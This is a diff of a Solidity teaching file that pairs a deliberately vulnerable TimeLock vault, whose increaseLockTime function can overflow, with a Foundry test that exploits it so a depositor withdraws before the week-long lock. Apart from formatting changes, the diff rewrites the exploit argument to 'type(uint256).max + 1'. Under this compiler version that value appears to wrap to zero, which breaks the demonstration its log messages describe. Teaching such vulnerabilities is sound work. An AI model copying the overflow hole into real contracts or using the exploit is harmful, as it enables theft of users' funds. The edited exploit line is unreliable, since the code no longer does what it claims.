@@ -3,7 +3,6 @@ pragma solidity ^0.7.6;
 
 import "forge-std/Test.sol";
 
-
 // This contract is designed to act as a time vault.
 // User can deposit into this contract but cannot withdraw for atleast a week.
 // User can also extend the wait time beyond the 1 week waiting period.
@@ -22,23 +21,26 @@ and was able to withdraw before the 1 week waiting period.
 */
 
 contract TimeLock {
-    mapping(address => uint) public balances;
-    mapping(address => uint) public lockTime;
+    mapping(address => uint256) public balances;
+    mapping(address => uint256) public lockTime;
 
     function deposit() external payable {
         balances[msg.sender] += msg.value;
         lockTime[msg.sender] = block.timestamp + 1 weeks;
     }
 
-    function increaseLockTime(uint _secondsToIncrease) public {
+    function increaseLockTime(uint256 _secondsToIncrease) public {
         lockTime[msg.sender] += _secondsToIncrease; // vulnerable
     }
 
     function withdraw() public {
         require(balances[msg.sender] > 0, "Insufficient funds");
-        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
+        require(
+            block.timestamp > lockTime[msg.sender],
+            "Lock time not expired"
+        );
 
-        uint amount = balances[msg.sender];
+        uint256 amount = balances[msg.sender];
         balances[msg.sender] = 0;
 
         (bool sent, ) = msg.sender.call{value: amount}("");
@@ -55,10 +57,10 @@ contract ContractTest is Test {
         TimeLockContract = new TimeLock();
         alice = vm.addr(1);
         bob = vm.addr(2);
-        vm.deal(alice, 1 ether);   
+        vm.deal(alice, 1 ether);
         vm.deal(bob, 1 ether);
-    }    
-           
+    }
+
     function testFailOverflow() public {
         console.log("Alice balance", alice.balance);
         console.log("Bob balance", bob.balance);
@@ -69,22 +71,24 @@ contract ContractTest is Test {
         console.log("Alice balance", alice.balance);
 
         console.log("Bob deposit 1 Ether...");
-        vm.startPrank(bob); 
+        vm.startPrank(bob);
         TimeLockContract.deposit{value: 1 ether}();
         console.log("Bob balance", alice.balance);
 
         // exploit here
-        TimeLockContract.increaseLockTime(
-            type(uint).max + 1 - TimeLockContract.lockTime(bob)
-        );
+        TimeLockContract.increaseLockTime(type(uint256).max + 1);
 
-        console.log("Bob will successfully to withdraw, because the lock time is overflowed");
+        console.log(
+            "Bob will successfully to withdraw, because the lock time is overflowed"
+        );
         TimeLockContract.withdraw();
         console.log("Bob balance", bob.balance);
         vm.stopPrank();
 
         vm.prank(alice);
-        console.log("Alice will fail to withdraw, because the lock time not expired");
-        TimeLockContract.withdraw();    // expect revert
+        console.log(
+            "Alice will fail to withdraw, because the lock time not expired"
+        );
+        TimeLockContract.withdraw(); // expect revert
     }
 }
